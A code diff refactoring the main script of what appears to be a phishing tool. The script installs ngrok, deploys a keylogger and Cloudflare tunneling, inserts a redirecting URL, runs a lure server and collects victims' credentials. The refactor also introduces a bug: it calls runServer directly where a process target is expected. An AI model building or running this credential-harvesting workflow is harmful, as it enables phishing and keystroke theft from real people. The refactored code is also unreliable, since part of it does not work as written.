@@ -15,34 +15,31 @@ from Defs.Languages import *
 
 
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
-checkPermissions()
-installGetText()
-languageSelector()
-checkConnection()
-checkNgrok()
+PermissionsManager.checkPermissions()
+ConnectionManager.verifyNetHunterConnection()
+ConnectionManager.confirmConnection()
+ServerManager.installNgrok()
 ifSettingsNotExists()
 readConfig()
 
 
 if __name__ == "__main__":
     try:
-        runMainMenu()
-        mainMenu()
+        ActionsManager.runMainMenu()
+        EssentialsManager.mainMenu()
 
-        keyloggerprompt()
-        addingkeylogger()
-        cloudfarePrompt()
-        addingCloudfare()
-        inputCustom()
-        port = selectPort()
+        ActionsManager.deployKeylogger()
+        ActionsManager.deployCloudfare()
+        ActionsManager.insertRedirectingURL()
+        port = ActionsManager.selectPort()
 
-        ##############
-        runServer(port)
-        selectServer(port)
+        ServerManager.runServer(port)
+        ServerManager.selectServer(port)
 
-        multiprocessing.Process(target=runServer, args=(port,)).start()
-        getCredentials(port)
+        multiprocessing.Process(
+            target=ServerManager.runServer(port), args=(port,)).start()
+        ActionsManager.getCredentials(port)
 
     except KeyboardInterrupt:
-        endMessage()
+        EssentialsManager.endMessage()
         exit(0)
